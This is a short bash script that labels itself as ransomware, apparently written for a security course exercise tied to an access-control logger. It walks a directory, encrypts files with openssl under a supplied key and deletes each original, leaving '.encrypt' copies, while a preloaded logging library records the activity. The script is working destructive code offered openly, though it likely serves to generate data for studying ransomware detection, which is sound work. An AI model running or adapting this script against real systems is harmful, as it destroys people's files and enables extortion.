#!/bin/bash

# =================== STEP 1: Implement the ransomware ====================================
dir=$1
enc_func=$2
key=$3
max=$4

num_files=0
i=0
for files in ${dir}/*
do
	# Revert path, separate it with delimiter '/' and store the 1st field, Revert again <=> File Name
	file_name[$i]=$(echo "${files}" | rev | cut -d '/' -f1 | rev)
	extension=$(echo "${file_name[$i]}" | cut -d '.' -f3)

	#In case will run ransomware 2nd time so won't encypt the already encrypted files.
	if [[ $extension != "encrypt" ]]
	then
		desire_files[${num_files}]=${file_name[$i]}
		num_files=$((${num_files}+1))

	fi

	i=$(($i+1))
done

i=0
while [[ $i -lt $max ]]
do	
	to_enc=${dir}/${desire_files[$i]}
	enc=${dir}/${desire_files[$i]}.encrypt
	i=$((i+1))
	
	echo -n `LD_PRELOAD=./logger.so openssl ${enc_func} -in ${to_enc} -out ${enc} -e -k ${key} -pbkdf2`
	rm -f ${to_enc}
	if [[ $i -eq $num_files ]]; then
		break
	fi
done

echo -n `LD_PRELOAD=./logger.so ./test_aclog 10000`

